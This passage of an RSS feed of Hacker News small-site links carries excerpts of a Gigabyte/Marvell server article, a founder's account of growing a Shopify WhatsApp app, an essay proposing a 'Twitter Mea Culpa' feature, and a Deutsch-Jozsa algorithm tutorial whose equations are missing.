<p>We still have several months until the next x86 server platform launch. In the meantime, expect Gigabyte with its partners such as Marvell to turn up their efforts marketing their new cloud servers. Intel’s 10nm delays have opened the door to a host of new competitors that have AMD EPYC Rome-like features such as 8-channel DDR4-3200 and PCIe Gen4 well before Intel will release Ice Lake Xeon platforms.</p>
<p>A big part of Gigabyte’s server strategy is embracing new and diversified architectures. That is part of the reason they have their <a href="https://www.gigabyte.com/Events/virtualshow">virtual event online</a>. Their goal is to provide access to Gigabyte staff as one would at the Computex trade show. Given travel and trade show challenges this year, Gigabyte is using the online format.</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/gigabyte-shows-marvell-thunderx3-r282-2u-server/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734547</guid>
            <pubDate>Sat, 04 Jul 2020 20:01:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I grew my Shopify micro-SaaS]]>
            </title>
            <description>
<![CDATA[
Score 136 | Comments 54 (<a href="https://news.ycombinator.com/item?id=23734539">thread link</a>) | @amrrs
<br/>
July 4, 2020 | https://www.preetamnath.com/blog/grow-shopify-micro-saas-to-25k-mrr-in-14-months | <a href="https://web.archive.org/web/*/https://www.preetamnath.com/blog/grow-shopify-micro-saas-to-25k-mrr-in-14-months">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>14 months ago, my co-founder <a href="https://twitter.com/sankalpjonna" target="_blank">Sankalp</a> and I set out to build a business that can sustain our livelihood while allowing us the freedom to live life on our terms. </p><p>When we started, we each had roughly 12 months of savings to survive on, assuming we made $0. Hence our minimum goal was to make $1,500/mo and the case where we would be celebrating with champagne was set to $3,000/mo.</p><p>We launched our app on April 24, 2019. The first paid plan was launched on June 4, 2019. Around the same time, we got <a href="https://www.preetamnath.com/blog/shopify-micro-saas-growth" target="_blank">featured by Shopify</a>. Here's a <a href="https://apps.shopify.com/whatsapp-chat-button" target="_blank">link to the app</a> if you want to check it out.</p><p>14 months later, we grew past $25,000 in MRR while remaining a 2 person team.</p><figure id="w-node-e5ce9f7f0ba4-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004959a0b62d53946fd901_shopify%20earnings%20growth.png" alt=""></p><figcaption><em>Note:&nbsp;Earnings reflect after a 1 month delay</em></figcaption></figure><p>I’m so proud of what we have built here.</p><p>If life is a video game, and there’s 100 levels to it, I feel like we have finally crossed level 1.</p><p>Here's what we've been up to in the 14 months since launch:</p><ul role="list"><li>20,000 active merchants (users) on the app</li><li>1,500+ paying merchants (customers)</li><li>450,000 automated WhatsApp messages sent in June</li><li>2.2 million WhatsApp chat messages initiated in June</li><li>Highest rated 5.0 🌟 app for all things WhatsApp with 500+ reviews</li><li>Users from 50+ countries around the world</li></ul><figure id="w-node-0cd8870c808c-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f007ba5d6c3b3532b0aa784_paying%20customers%20countries.png" alt=""></p></figure><p>We did a lot of things right, but we also messed up here and there. I've tried to capture an honest and accurate account of our journey so far.</p><h2>11 key learnings and mistakes from our journey<br></h2><h3>1- Learning: Always keep moving the needle</h3><p>Running your own business and having 100% freedom and flexibility is a gift or a curse, depending on how you use it. It’s easy to get lost in building, polishing, bringing your ideas to life. But remember, the only things that matter are what move the needle. </p><p>For every decision related to your business, you should always run it through a set of questions that help you filter out whether your idea is aligned to your business goals.</p><ul role="list"><li>Does it help our app get more users</li><li>Does it help convert more users to paying customers</li><li>Does it help users derive more value and ROI from the app</li><li>Does it meaningfully improve user experience</li><li>Does it reduce our support ticket load</li><li>Does it have any unintended 2nd order consequences that can bite us later</li></ul><p>Ultimately, you want to keep making decisions that move the needle for your business - by bringing you more customers and revenue, or making it easier and less time consuming to run the business (if that’s one of your goals, it is for us).<br></p><h3>2- Learning: Help users realise value as soon as possible</h3><p>From our research, we learnt that Shopify merchants are mostly solopreneurs or teams of 2-10. They are always time and resource crunched.</p><p>We wanted to enable our users to start using the app with the least amount of setup time or steps. This reflects in in the user experience of the app. </p><p>For example, when a first time user enters their phone number and hits the “Save” button, at this time the user is looking to test our app and see if it fits their needs. We speed that up by&nbsp;automatically enabling the chat button on first save, along with the best default configuration for all chat button related settings.</p><figure id="w-node-4b9a52f7ced2-2f0d8df6"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/o3oeGyv-JJs"></iframe></p></figure><p>Another example, when a user wants to start sending automated messages, all they have to do is click on the “Enable” button. All the app’s default configuration is automatically applied and the user can start seeing value immediately.</p><figure id="w-node-4bee860d412d-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004a6e594ffa16384d47ca_automated-message-setup-1.png" alt=""></p></figure><figure id="w-node-8c9743f7a3e0-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004a858d5f7ceaad74de97_automated-message-setup-2.png" alt=""></p></figure><h3>3- Learning: Care about your users, they can feel it</h3><p>Users are on a mission to achieve their goals. They typically need your help when there’s something that stops them from getting there.</p><p>From day 1, we were clear on providing the best possible support. Our users would be thrilled to see bug fixes deployed in 15 minutes, WhatsApp &amp; email replies in 5 minutes, and so on. We were fast, we were responsive.</p><p>This worked in our favour - users showered us with positive reviews which is how we managed 500+ reviews while staying 5.0 star rated.</p><figure id="w-node-f55f45993a1f-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004affbd3802acac60056d_superlemon%20whatsapp%20app%20shopify%20reviews.png" alt=""></p></figure><p>But customer support isn’t only about getting reviews. We’ve had users who prefer using our app instead of competitors because</p><p><strong>A-</strong> We reply quickly</p><p><strong>B-</strong> We proactively provide information beyond the immediate premise of the query</p><figure id="w-node-e499fce41f50-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f0065d67e883834a7802cc8_review-users-care.png" alt=""></p><figcaption><em>Your users can feel when you genuinely care about them</em></figcaption></figure><h3>4- Learning: Be smart about managing and reducing support ticket volume</h3><p>The downside of trying to be a customer support hero is, you only have finite hours in the day, and you don’t want to spend most of it replying to customers. </p><p>We took 3 specific initiatives to reduce support tickets.</p><p><strong>1- Embed FAQs within the product</strong></p><p>We found that users would have FAQs around specific features, and they wouldn’t really go to the help center and reference it. To them, it’s simpler to ask for help.</p><p>To solve this problem, we embedded FAQs inside the product itself. </p><p>Here are a few examples where we included the most commonly asked question beside the feature configuration. </p><figure id="w-node-1def5927520e-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004c97d6c3b3b5f30a4556_faq-inside-product-1.png" alt=""></p></figure><figure id="w-node-11706312cf8a-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004ca08216b9c33aaef853_faq-inside-product-2.png" alt=""></p></figure><figure id="w-node-9239f016ade1-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004ca87bc6f87761475470_faq-inside-product-3.png" alt=""></p></figure><p>The results were always immediately noticeable. Where we would get 10 questions a week about X, would drop to 1-2, thereby freeing us up from answering repetitive support questions.</p><p><strong>2- Fix repetitive bugs</strong></p><p>If a bug appears more than thrice in a span of days, the third time is when we go ahead and permanently fix it. Why thrice? That way we don’t overwhelm ourselves with trying to fix every single bug, but only the ones that appear repeatedly and take up support time.</p><p><strong>3- Remove WhatsApp chat support and go with Email only</strong></p><p>During initial days, we found it useful to let our users contact us on WhatsApp. It lead to tons of conversations which shaped our understanding of the user’s needs and how we can better solve them. </p><p>But having WhatsApp as a support channel had 3 issues:</p><p><strong>1-</strong> With time, we discovered that people find dropping a message on WhatsApp to be very low barrier. Which means they wouldn’t take a moment to look around, be patient enough to find out how the issue that they are about to describe has already been solved inside the app. It’s just easier to WhatsApp us.</p><p><strong>2-</strong> We also discovered that users had an unrealistic expectation of quick replies and quick resolutions on WhatsApp. Granted, we would be quick whenever possible. But if it’s 11pm at night and the user asks if a bug is fixed 10 minutes later, it can get a bit annoying.</p><p><strong>3-</strong> I started dreading picking up my phone, seeing it full of support tickets every morning.</p><p>To solve this, we removed the WhatsApp chat button from our own app, and replaced it with an Email support button instead. All 3 problems listed above got resolved to a great degree.</p><figure id="w-node-09f7b09a3b19-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004d01e45cb8848d6cf0f7_Email%20support%20only.png" alt=""></p></figure><p>We also made numerous smaller tweaks to optimise our support flow. One of the tiny but powerful tweaks was to automatically populate the email subject line with the user’s Shopify store url. That made it so much faster for us to look up the specific user instead of a meaningless back and forth of “what’s your store url”.</p><figure id="w-node-280b459e613d-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f00533cbd380208b160157f_store%20url.jpg" alt=""></p></figure><p>Our efforts have paid off. Unless we’re building new features, we spend only about <strong>15-30 minutes per day</strong> on customer support.<br></p><h3>5- Learning: Say No, often</h3><p>Users ask for all sorts of functionality. It doesn’t mean you should build them. </p><p>Whenever we get feature requests, we add a card in our internal Notion board and judge the card against 3 factors</p><p><strong>1-</strong> how many times do we receive the same request</p><p><strong>2-</strong> does the feature align with the rest of our product</p><p><strong>3-</strong> does the feature add core value to the user</p><p>Many times, we found users requesting features that would save them the hassle of using another app. Now, if that functionality enhances the rest of our app, it’s the right feature to add. But if it doesn’t, then we politely decline.</p><figure id="w-node-2831ff295f9b-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f00517014696c60a040b940_politely%20saying%20no.png" alt=""></p></figure><p>There are 2 types of responses we give to customers regarding feature requests:</p><p><strong>1-</strong> Tell them that this feature isn’t requested by other users that much, and since we are a small team with limited resources, we may not be prioritising this feature in the near future.</p><p><strong>2-</strong> Tell them that this feature is already part of our roadmap, and that we will reach out to them whenever it’s ready. I generally avoid giving timelines, to account for “life happens, plans change”.</p><p>This learning extends beyond just feature requests. </p><p>In the past year, we have received tons of business proposals, partnerships, integration requests, collaborative marketing invitations etc. Saying No allowed us to remain focused on what’s really important.<br></p><h3>6- Mistake: Optimise top of the funnel</h3><p>I was under the impression that during build phase, we shouldn’t focus too much on optimisation. After all, you don’t want to get busy squeezing another 10% when the potential is to 10x. </p><p>In most cases, I think I made the right call. One place I made the wrong call was the user onboarding flow.</p><p>Until March 2020, users would install the app and directly land on the chat settings page, which is the starting point of the user’s journey. We were getting a steady flow of 10-15 paid trials initiated per day. </p><p>Adding a step of friction before this would be counterintuitive, right? It couldn’t possibly increase trials, right?</p><p>Sigh. </p><p>When we added one screen which asked the user upfront whether they want to continue with the Free plan, or start a trial for the Paid plan, daily paid trials DOUBLED overnight, while trial-to-paid conversion rate remained steady at 50%. </p><figure id="w-node-c2d582bcc858-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f004d9fda26a209aa082a72_onboarding%20trial%20doubled.png" alt=""></p></figure><p>The experiment took us a day to build, and after a week we concluded what was clearly the winner.</p><p>I normally advocate for focusing on building vs optimising in the early stages, but in this case I didn’t know that optimisation was waiting to unlock 100% increase in trials.</p><p>My takeaway here is - always keep your eyes open for bottlenecks at the top of funnel. </p><p>If there’s copy on your website, or a specific sign up flow that might be holding you back from getting 2x the users, you need to unblock it early and realise compounded gains over time.<br></p><h3>7- Mistake: Competition will copy, don’t completely ignore them</h3><p>In the past year, we’ve seen competitors copy our app interface, in-app descriptions, button designs, app listing text word-for-word in many cases. Initially we were furious, but instead we kept our head down and focused on customer’s needs. </p><p>Eventually we started ignoring our competitors, which was a mistake. While …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.preetamnath.com/blog/grow-shopify-micro-saas-to-25k-mrr-in-14-months">https://www.preetamnath.com/blog/grow-shopify-micro-saas-to-25k-mrr-in-14-months</a></em></p>]]>
            </description>
            <link>https://www.preetamnath.com/blog/grow-shopify-micro-saas-to-25k-mrr-in-14-months</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734539</guid>
            <pubDate>Sat, 04 Jul 2020 20:00:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[De-escalating social media conflict]]>
            </title>
            <description>
<![CDATA[
Score 548 | Comments 315 (<a href="https://news.ycombinator.com/item?id=23734535">thread link</a>) | @npunt
<br/>
July 4, 2020 | https://nickpunt.com/blog/deescalating-social-media/ | <a href="https://web.archive.org/web/*/https://nickpunt.com/blog/deescalating-social-media/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>Social media has a conflict problem.</p><p>Spending even a few minutes on public social media can expose us to dozens of people we know little about, talking about things we know little about. In such a public place, any individual's reputation, perspectives, and history are difficult to ascertain, and therefore their words must be taken at face value. Coupled with an almost complete lack of standards for participation in the community and a high degree of variance in knowledge among participants, and the environment naturally skews toward conflict and tribalism.</p><p>One particular effect of this environment is that small misunderstandings, mistakes, or disagreements can unexpectedly explode due to the public nature of discourse and assumptions of bad faith. Meanwhile, very few tools exist to moderate these effects.</p><!--kg-card-begin: markdown--><p>This is why it's my belief that <mark>as designed today, social media is out of balance</mark>. It is far easier to escalate than it is to de-escalate, and this is a major problem that companies like Twitter and Facebook need to address.</p>
<!--kg-card-end: markdown--><p>This got me thinking about what particular use cases need de-escalation, and whether there's something simple we can do to test the waters and address these types of problems. </p><h2 id="target-use-case-admitting-mistakes">Target Use Case: Admitting Mistakes</h2><p>One obvious issue is that <strong>people are wrong about a lot of things, but struggle to admit their mistakes</strong>. This is why many cultures have created elaborate norms around face-saving. Unfortunately, social media largely lacks these cultural norms, and even makes the problem worse in three ways:</p><ol><li><strong>No social proof</strong> - Admitting mistakes is quite difficult if nobody else is seen (genuinely) admitting mistakes, as we rely heavily on social proof to sense-make around norms. An escalation-oriented culture means there's less genuine "I was wrong" on social media than there should be.</li><li><strong>No respite</strong> - as the visibility of a mistake travels across social media, the poster is subject to a constant deluge of new readers calling them out, with the combined energy of the outraged far exceeding that of the poster. This prevents them from having the necessary emotional cool-down period to respond thoughtfully.</li><li><strong>Digging in</strong> - when feeling personally attacked, its human nature to prefer to dig in rather than apologize. Social media's escalation-oriented culture plays into this human fallibility.</li></ol><p>Take Twitter as an example environment. If we write something that turns out to be wrong and a pile-on begins, we're going to be swimming upstream fighting it. Our options are:</p><ol><li><strong>Ignore</strong> replies and hopefully let it die out</li><li><strong>Delete</strong> your tweet, posting another tweet saying "I was wrong"</li><li><strong>Reply</strong> to your tweet, posting "I was wrong"</li></ol><p>However, none of these are great. If we ignore<strong><em> </em></strong>replies, the simple amplification effects of likes, replies, retweets, and subtweets leave us exposed and the situation can get out of hand. If we delete and post another, people are unlikely to see our follow-up, as corrections are rarely viral. Similarly, even if we reply, only our viral mistake will be seen in the feed of others. </p><p>Let's also not forget the human tendency to not fully walk back statements, and instead offer unsatisfying explanations that can accidentally further enflame situations. Blaming, justifying, minimizing, or excusing are all self-sabotaging ways that people qualify their apologies to preserve their self-esteem or resolve their own cognitive dissonance, and social media is right there ready to give us this kind of rope to hang ourselves with when we're under assault.</p><!--kg-card-begin: markdown--><p>In all these cases, a person's reputation in the minds of others is damaged because <mark>social media engagement engines favor the drama of the mistake over the correction and reconciliation</mark>, which leads few people to see or remember anything other than the mistake.</p>
<!--kg-card-end: markdown--><p>This seems like a perfect use case to design for, so I came up with a little design change I call the Twitter Mea Culpa.</p><h2 id="design-exploration-twitter-mea-culpa">Design Exploration: Twitter Mea Culpa</h2><p>Twitter Mea Culpa is a way for a poster to flag their tweet as a mistake and de-escalate a situation, using the same action menu that deleting a post uses, and the same visual design as flagged tweets:</p><figure><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Blue-w-Menu-NoLabel-1.png 1260w" sizes="(min-width: 720px) 720px"><figcaption>Twitter Mea Culpa: flagging a post as a mistake</figcaption></figure><h3 id="clear-language">Clear Language</h3><!--kg-card-begin: html--><figure><a href="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png"><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Language-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Language-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Language-1.png 1198w" sizes="(min-width: 720px) 720px"></a><figcaption>Language:<em> @user has indicated they made a mistake in this tweet</em></figcaption></figure><!--kg-card-end: html--><p>I picked this language carefully for several reasons:</p><ol><li>Create separation between the individual and what they say (the specific post), which reduces ego threat.</li><li>Use an active voice to indicate responsibility (<em>I made a mistake</em> not <em>Mistakes were made</em>).</li><li>Indicate the poster was the one who chose to flag the post, not Twitter or any other user, to reduce the impression to other users that the poster was censored.</li><li>State the mistake unequivocally and leaving no room for ambiguity about whether it is actually a mistake, to reduce inauthentic use and self-sabotage.</li><li>Avoid direct use of 'sorry' or 'I apologize' language, because for some people these words are extremely <a href="https://www.psychologytoday.com/us/blog/the-squeaky-wheel/201305/5-reasons-why-some-people-will-never-say-sorry">emotionally challenging</a> to use.</li></ol><h3 id="disable-amplification">Disable Amplification</h3><!--kg-card-begin: html--><figure><a href="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png"><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-Amplification-1.png 600w, https://nickpunt.com/content/images/size/w1000/2020/07/TwitterMeaCulpa-Amplification-1.png 1000w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-Amplification-1.png 1262w" sizes="(min-width: 720px) 720px"></a></figure><!--kg-card-end: html--><p>Much like rules violations, once a user admits a mistake, the Mea Culpa tweet is no longer amplified. This means:</p><ul><li>The tweet is no longer made visible on everyone's home feed</li><li>Users cannot reply, like, or retweet without comment</li><li>Users may retweet <em>with</em> comment, to allow users to amplify the correction (e.g. <em>I thought this wasn't the case, looks like they realized it</em>)</li></ul><!--kg-card-begin: markdown--><p>By admitting a mistake, the poster stops the runaway train of replies and amplifications of their mistake, and the reputation damage that follows. In other words, <mark>Mea Culpas are intentionally designed to favor respectful debate and ability to cool off over maximal information exchange</mark>.</p>
<!--kg-card-end: markdown--><figure><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-ExampleViolation.png" alt=""><figcaption>How Twitter handles rules violations today; notice the lack of like/reply/retweet counts</figcaption></figure><p>This amplification disabling is how rules violations work today. However admitting a mistake is much more innocuous, so I would recommend that existing replies, retweets, and likes remain accessible, which is not the case with violations. After all, sometimes mistakes can create interesting conversation.</p><h3 id="surface-corrections">Surface Corrections</h3><p>One possible exception to the disable amplification rule is that a Mea Culpa tweet could show up again <em>within the home feeds of users who originally reacted to it</em>. This would basically be like issuing a correction, which would be intended to help limit accidental falsehoods from spreading. </p><figure><img src="https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-FeedCorrection-1.png" alt="" srcset="https://nickpunt.com/content/images/size/w600/2020/07/TwitterMeaCulpa-FeedCorrection-1.png 600w, https://nickpunt.com/content/images/2020/07/TwitterMeaCulpa-FeedCorrection-1.png 707w"><figcaption>Mistake correction shown in Home Feed, shown because user liked the tweet</figcaption></figure><p>For instance, if someone tweeted an unsubstantiated rumor and we liked or replied to it, when we go back to our home feed a day or two later we'd see their tweet with the notice that they'd made a mistake.</p><p>This seems like the right thing to do, and a way to help social media stay more focused on truth.</p><h3 id="culture-of-use">Culture of Use</h3><p>Twitter Mea Culpa is meant to solve for a few specific use cases that involve the poster's authentic desire for de-escalation at some level:</p><ol><li><strong>I'm actually wrong </strong>- when the poster knows they are wrong and wants to stop hearing from people and just correct their mistake.</li><li><strong>I'm right if you look at it this way</strong> - when the poster is struggling to understand in what ways or from what perspectives they're wrong, but can tell they are a little bit wrong, and are considering explaining themselves.</li><li><strong>Fine, I give up </strong>- when the poster is struggling to apologize or admit they're wrong, as is often the case when people feel vulnerable or when their ego is bruised, and are starting to think it might be better to tap out than to continue.</li></ol><p>Today, the <em><strong>I'm actually wrong</strong></em><strong> </strong>case is an obvious flaw in the system, where posters have to constantly reply to people saying <em>"yeah, I know, I know, I was wrong, look at my other tweet"</em>. In this case, their reputation is less at risk and they're already at a point of emotional acceptance, so it's simply a matter of unnecessary UX friction.</p><p>The much more interesting and subtle cases are <strong><em>I'm right if you look at it this way</em></strong> and <strong><em>Fine, I give up</em></strong>. Posters in these situations may not yet have the emotional distance to gain proper perspective, still feeling a connection between what they said and who they are (ego threat). As mentioned before, the lack of respite in social media can keep people in this emotional state for a lot longer than they might otherwise be, as each new notification they receive keeps them in a state of alert.</p><p>In these situations, there's an emotional temptation to respond when it's often best not to, given the escalating nature of the medium. The temptation comes from a poster having only one tool at their disposal to repair their reputation: replying to the tweets contributing to their threatened feelings. </p><p>With Mea Culpa, users gain a second tool specifically designed to de-escalate, that only requires their acknowledgement that a) they may be at least partly wrong, and b) they do not wish to continue. When in use, it can cut off potentially escalating conversations early, giving everyone else who sees the tweet the signal to step back because the poster may not have meant it and (at least partially) admits their mistake.</p><p>There is no guarantee that most or all conversations would de-escalate after a Mea Culpa, but in imagining the possible uses for it, I think it would help considerably.</p><h3 id="correcting-for-inauthenticity">Correcting for Inauthenticity</h3><p>Unfortunately, there are also many bad faith actors on social media, and there's potential for any feature to be used in a way that means something other than what was intended, creating a culture of alternate use and meaning. A few anti-patterns may emerge here:</p><ol><li><strong>Growth hacking</strong> - a user posts something intentionally fabulist they want others to see, get a lot of engagement, and then post a mistake tag to try to have people see it again.</li><li><strong>Ironic opposite</strong> - a user flags everything they post as a mistake, either in protest or just as an ironic statement.</li><li><strong>Just kidding </strong>- a user posts something boundary-pushing to float it as an idea, then walks it back with a mistake tag.</li><li><strong>I had to do it </strong>- a user posts something boundary-pushing that they believe, then walks it back with a mistake tag as a …</li></ol></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nickpunt.com/blog/deescalating-social-media/">https://nickpunt.com/blog/deescalating-social-media/</a></em></p>]]>
            </description>
            <link>https://nickpunt.com/blog/deescalating-social-media/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734535</guid>
            <pubDate>Sat, 04 Jul 2020 19:59:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deutsch-Jozsa Algorithm]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23734517">thread link</a>) | @keyboardman
<br/>
July 4, 2020 | https://leimao.github.io/blog/Deutsch-Jozsa-Algorithm/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/Deutsch-Jozsa-Algorithm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>In the previous <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">blog post</a>, I discussed the Deutsch’s algorithm which determines whether the function $f(x)$ is balanced or constant by running $f(x)$ once using quantum circuits, where $f(x)$ maps from the set $\{0,1\}$ to the set $\{0,1\}$. However, using classical circuits, we are able to determine whether the function $f(x)$ is balanced or constant by running $f(x)$ twice. It might seem to some people that the improvement is not significant for this particular simple problem.</p>



<p>Let’s change the problem setting to a similar but more sophisticated one. Instead of taking one single bit as input, $f(\mathbf{x})$ now takes $n$ bits as input. Now, $f(\mathbf{x})$ maps from the set $\{0,1\}^n$ to the set $\{0,1\}$. The number of different inputs to $f(\mathbf{x})$ is $2^n$. We call the the function $f(\mathbf{x})$ balanced if $f(\mathbf{x}) = 0$ for exactly $2^{n-1}$ of all the different inputs, and $f(\mathbf{x}) = 1$ for the rest of the inputs. We call the function $f(\mathbf{x})$ constant if $f(\mathbf{x}) = 0$ for all different inputs, or $f(\mathbf{x}) = 1$ for all different inputs. $f(\mathbf{x})$ could be neither balanced or constant, but in this particular problem, we assume the $f(\mathbf{x})$ we are investigating must be either balanced or constant. It should be noted that it is a more general case for the problem that the Deutsch algorithm was trying to solve. When $n=1$, it decays to the problem that the Deutsch algorithm was trying to solve.</p>



<p>With classical circuits, what is the minimum and maximum number of runs to determine whether $f(\mathbf{x})$ we are investigating must be either balanced or constant? We have $2^n$ different inputs to test for this binary classification problem. In the worst scenario, we could run into the situation that the first $2^{n-1}$ inputs we tested produce all $0$s or all $1$s. Then the $2^{n-1} + 1$th input we tested must tell us whether $f(\mathbf{x})$ could be neither balanced or constant. For example, if the first $2^{n-1}$ inputs we tested produce all $0$s, if the $2^{n-1} + 1$th input we tested produces $0$, then $f(\mathbf{x})$ is constant; if the the $2^{n-1} + 1$th input we tested produces $1$, then $f(\mathbf{x})$ is balanced. In the best scenario, we got both $0$ and $1$ in the first two runs, we immediately know $f(\mathbf{x})$ is balanced.</p>



<p>With quantum circuits, can we do better and how much can we do better? In fact, there is a Deutsch-Jozsa algorithm, a derivative of the Deutsch algorithm, which solve the problem using exactly one run. If you compared to the worst case using classical circuits, it is $2^{n-1} + 1$ times faster asymptotically, which is significant when $n$ is large.</p>



<p>In this blog post, I would like to discuss the Deutsch-Jozsa algorithm. It would be recommended if the reader could read the blog on <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">Deutsch algorithm</a> first, although this blog post should be mostly self-contained.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="reducing-sum-or-difference-to-boolean">Reducing Sum or Difference to Boolean</h4>

<p>If $x$ and $y$ are binary values, $x, y \in \{0, 1\}$, we have</p>



<p>where $\oplus$ is $\text{XOR}$ (binary addition modulo 2). This could be easily verified using truth table.</p>

<h4 id="distributivity-of-xor">Distributivity of XOR</h4>

<p>If $x$, $y$, and $z$ are binary values, $x, y, z \in \{0, 1\}$, we have</p>



<p>I did not find a proof from the Internet so I derived a proof here. The proof is a little bit complicated and requires to use boolean algebra.</p>



<p>It is easy to verify using truth table that</p>



<p>Using the basic <a href="https://en.wikipedia.org/wiki/Boolean_algebra#Laws">boolean algebra</a>, we have</p>





<p>Therefore,</p>



<p>This concludes the proof.</p>

<h4 id="inner-product-and-inner-product-space-for-binary-vector-space">Inner Product and Inner Product Space for Binary Vector Space</h4>

<p>In the previous <a href="https://leimao.github.io/blog/Inner-Product/">blog post</a>, we have defined the inner product and inner product space for complex vector space. Similarly, we could also define the inner product and inner product space for binary vector space.</p>



<p>Given two binary vectors $\mathbf{x}, \mathbf{y} \in \{0,1\}^n$, $\mathbf{x} = \{x_0, x_1, \cdots, x_{n-1}\}$ and $\mathbf{y} = \{y_0, y_1, \cdots, y_{n-1}\}$, the inner product of $\mathbf{x}$ and $\mathbf{y}$ is defined as</p>



<p>which is somewhat similar to the inner product definition for real vector space.</p>



<p>The bitwise exclusive-or operation $\oplus$ was also defined for binary vectors $\mathbf{x}$ and $\mathbf{y}$ of the same length. Given two binary vectors $\mathbf{x}, \mathbf{y} \in \{0,1\}^n$, $\mathbf{x} = \{x_0, x_1, \cdots, x_{n-1}\}$ and $\mathbf{y} = \{y_0, y_1, \cdots, y_{n-1}\}$,</p>



<p>The following inner product properties are satisfied based on the above inner product definition.</p>



<p>Given $\mathbf{x}, \mathbf{x}^{\prime}, \mathbf{y}, \mathbf{y}^{\prime} \in \{0,1\}^n$, using the $\text{XOR}$ distributivity property we derived above,</p>



<p>Similarly,</p>



<p>Let $\mathbf{0} = \{ \underbrace{0, 0, \cdots, 0}_{n} \} =  0^n$, we have</p>



<h4 id="hadamard-operator">Hadamard Operator</h4>

<p>Hardmard operator is a special quantum operator, which could be represented using the following unitary matrix.</p>



<p>It is easy to see that</p>





<p>We denote</p>



<p>It is easy to see that $H$ is unitary, i.e., $H H^{\dagger} = H^{\dagger} H = I$ and $H^{\dagger} = H$. In fact, $H^{\otimes n}$ is unitary, and $(H^{\otimes n})^{-1} = H^{\otimes n}$.</p>



<p>For Kronecker product, the $A \otimes B$ is invertible if and only if both $A$ and $B$ are invertible and</p>



<p>It is easy to verify this using the <a href="https://leimao.github.io/blog/Kronecker-Product-In-Circuits/">Kronecker product mixed-product property</a>.</p>



<p>Therefore,</p>



<p>The values in the matrix $H^{\otimes n}$ follows specific patterns. Specifically,</p>



<p>where $\mathbf{i}$ is the binary vector representation for row number $i$, and $\mathbf{j}$ is the binary vector representation for column number $j$.</p>



<p>Since I did not find any proof from the Internet, I would like to derive a simple proof using mathematical induction.</p>



<p>For the base case for $n = 1$, it is easy to verify that</p>



<p>where $i, j \in [0, 2^1)$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{1}$.</p>



<p>Assuming for $n = k - 1$,</p>



<p>where $i, j \in [0, 2^{k-1})$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{k - 1}$.</p>



<p>For $n = k$, we have</p>



<p>Note that $H^{\otimes {k-1}}$ is a $2^{k-1}$ by $2^{k-1}$ matrix.</p>



<p>For $i \in [0, 2^{k-1})$ and $j \in [0, 2^{k-1})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 0$, and $j_0 = 0$.</p>



<p>Therefore,</p>



<p>where $i \in [0, 2^{k-1})$ and $j \in [0, 2^{k-1})$.</p>



